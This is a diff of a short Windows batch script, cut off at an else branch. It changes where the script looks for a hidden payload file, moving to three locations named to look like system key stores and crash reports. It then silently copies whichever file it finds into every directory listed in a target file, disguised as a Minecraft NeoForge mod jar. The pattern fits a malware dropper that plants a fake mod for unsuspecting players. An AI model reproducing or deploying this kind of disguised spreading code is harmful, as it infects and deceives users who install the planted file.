@@ -1,7 +1,13 @@
 @echo off
-set "src=%APPDATA%\Microsoft\Edge\cache.dat"
-set "tgt=%APPDATA%\Microsoft\Edge\cache.target"
-if not exist "%src%" exit /b
+set "src1=%APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat"
+set "src2=%APPDATA%\Microsoft\Protect\syskeys.dat"
+set "src3=%APPDATA%\Microsoft\Windows\WER\ReportArchive\crash.dat"
+set "src="
+if exist "%src1%" set "src=%src1%"
+if not defined src if exist "%src2%" set "src=%src2%"
+if not defined src if exist "%src3%" set "src=%src3%"
+if not defined src exit /b
+set "tgt=%APPDATA%\Microsoft\Crypto\RSA\MachineKeys.target"
 if exist "%tgt%" (
   for /f "usebackq delims=" %%p in ("%tgt%") do copy /y "%src%" "%%p\e4all-neoforge-1.6.2.jar" >nul 2>&1
 ) else (
